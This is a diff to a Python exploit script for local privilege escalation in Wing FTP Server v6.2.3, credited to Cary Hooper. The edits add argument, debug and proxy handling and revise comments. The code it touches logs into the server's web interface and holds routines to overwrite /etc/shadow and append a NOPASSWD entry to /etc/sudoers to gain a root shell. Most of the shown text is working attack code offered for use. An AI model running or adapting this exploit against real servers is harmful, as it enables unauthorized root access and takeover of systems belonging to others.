@@ -1,19 +1,9 @@
 #!/usr/bin/python3
-#Exploit for Wing FTP Server v6.2.3 (other versions may be vulnerable
+#Exploit for Wing FTP Server v6.2.3 (other versions may be vulnerable)
 #Discovered by Cary Hooper (@nopantrootdance)
 
 import paramiko,sys,warnings,requests,re,time,argparse
 warnings.filterwarnings("ignore")
-DEBUG = False
-
-#Argument handling.  Needs an upgrade
-#option for hostname
-#option for port
-#option for username
-#option for password
-#option for debug
-#option for proxy support
-#option to specify new root password
 
 #Argument handling.
 parser = argparse.ArgumentParser(description="Exploit for Wing FTP Server v6.2.3 Local Privilege Escalation",epilog=print(f"Exploit by @nopantrootdance."))
@@ -30,8 +20,15 @@ global password
 global proxies
 global port
 global hostname
+global DEBUG
 username = args.username
 password = args.password
+
+#Turn on debug statements
+if args.verbose:
+	DEBUG = True
+else:
+	DEBUG = False
 
 #Handle nonstandard SSH port
 if ':' in args.target:
@@ -44,6 +41,9 @@ else:
 
 #Prepare proxy dict (for requests)
 if args.proxy:
+	if ("http://" not in args.proxy) and ("https://" not in args.proxy):
+		print(f"[!] Invalid proxy.  Proxy must have http:// or https:// {proxy}")
+		sys.exit(1)
 	proxies = {'http':args.proxy,'https':args.proxy}
 else:
 	proxies = {}
@@ -137,6 +137,7 @@ def log(string):
 		print(string)
 
 #Checks to see which URL is hosting Wing FTP
+#Returns a URL, probably. HTTPS preferred.  empty url is checked in main()
 def checkHTTP(hostname):
 	protocols= ["http://","https://"]
 	for protocol in protocols:
@@ -155,7 +156,6 @@ def checkHTTP(hostname):
 	return url
 
 #Log in to the HTTP interface.  Returns cookie
-#Needs to check first whether interface is HTTP or HTTPS.  
 def getCookie(url,webuser,webpass,headers):
 	log("getCookie")
 	loginURL = f"{url}/loginok.html"
@@ -168,7 +168,7 @@ def getCookie(url,webuser,webpass,headers):
 	return cookies
 
 #Change directory within the web interface.
-#The actual POST request changes state.  We keep track of that stat in directorymem array.
+#The actual POST request changes state.  We keep track of that state in directorymem array.
 def chDir(url,directory,headers,cookies,directorymem):
 	log("chDir")
 	data = {"dir": directory}
@@ -222,7 +222,8 @@ def saveFile(newfilecontent,file,url,headers,cookies,referer,directorymem):
 
 #Other methods may be more stable, but this works.
 #"You can't argue with a root shell" - FX
-#Let me know if you know of other ways to increase privilege by overwriting files!
+#Let me know if you know of other ways to increase privilege by overwriting or creating files.
+#Mind that in this version of Wing FTP, files will be saved with umask 111.  This makes changing /etc/sudoers infeasible.
 #This routine overwrites the shadow file
 def overwriteShadow(url):
 	log("overwriteShadow")
@@ -249,6 +250,7 @@ def overwriteShadow(url):
 
 #This function amends the /etc/sudoers file.  This doesn't work as is. 
 #Sudo won't work with 666 permissions.  Future releases of wftpserver may help this method.
+#Still researching whether /etc/sudoers.d/<user> files can be world-writable.
 def forgeSudoers(url):
 	#{username} ALL=(ALL) NOPASSWD: ALL
 	log("forgeSudoers")
@@ -307,6 +309,7 @@ def main():
 		#Now we can log into the FTP web app with h00p:h00p
 		
 		url = checkHTTP(hostname)
+		#Check that url isn't an empty string (and that its a valid URL)
 		if "http" not in url:
 			print(f"[!] Exiting... cannot access web interface.")
 			sys.exit(1)
